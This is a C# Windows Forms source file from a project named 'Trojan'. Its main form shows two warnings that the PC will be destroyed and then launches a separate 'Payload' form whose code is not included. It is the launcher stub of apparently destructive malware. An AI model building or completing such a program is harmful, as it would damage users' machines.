using System;
using System.Windows.Forms;

namespace Trojan
{
    public partial class MainFRM : Form
    {
        public MainFRM( ) => InitializeComponent( );

        private void MainFRM_Load( object sender, EventArgs e )
        {
            if ( MessageBox.Show( "Are you certian you'd like to run this program?", "Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning ) == DialogResult.No )
                Close( );
            else
                FinalWarning( );
        }

        public void ExecutePayload( )
        { 
            Hide( );

            var PayloadForm = new Payload( );

            PayloadForm.ShowDialog( );
            Close( );
        }

        public void FinalWarning( )
        {
            if ( MessageBox.Show( "This is your last chance. Your PC will be destroyed.", "Last Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning ) == DialogResult.No )
                Close( );
            else
                ExecutePayload( );
        }
    }
}
